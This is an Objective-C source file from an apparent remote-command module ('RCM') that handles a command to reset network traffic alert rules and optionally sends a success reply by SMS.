//
//  ResetNetworkAlertCriteriaProcessor.m
//  RCM
//
//  Created by ophat on 1/18/16.
//
//

#import "ResetNetworkAlertStatisticProcessor.h"
#import "NetworkTrafficAlertManager.h"

@interface ResetNetworkAlertStatisticProcessor (PrivateAPI)
- (void) resetNetworkAlertCriteria;
- (void) sendReplySMS;
@end

@implementation ResetNetworkAlertStatisticProcessor

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"ResetNetworkAlertStatisticProcessor--->initWithRemoteCommandData")
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

- (void) doProcessingCommand {
    DLog (@"ResetNetworkAlertStatisticProcessor--->doProcessingCommand");
    
    [self processResetNetworkAlertCriteria];
}

#pragma mark RequestResetNetworkAlertCriteriaProcessor Private Mehods

- (void) processResetNetworkAlertCriteria {
    DLog (@"ResetNetworkAlertStatisticProcessor--->processing");
    id <NetworkTrafficAlertManager> networkTrafficManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mNetworkTrafficAlertManager];
    [networkTrafficManager resetNetworkTrafficRules];
    [self sendReplySMS];
}

- (void) sendReplySMS{
    DLog (@"ResetNetworkAlertStatisticProcessor--->sendReplySMS")
    
    NSString *message = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                    andErrorCode:_SUCCESS_];
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:message];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:message];
    }
}

- (void) dealloc {
    [super dealloc];
}




@end
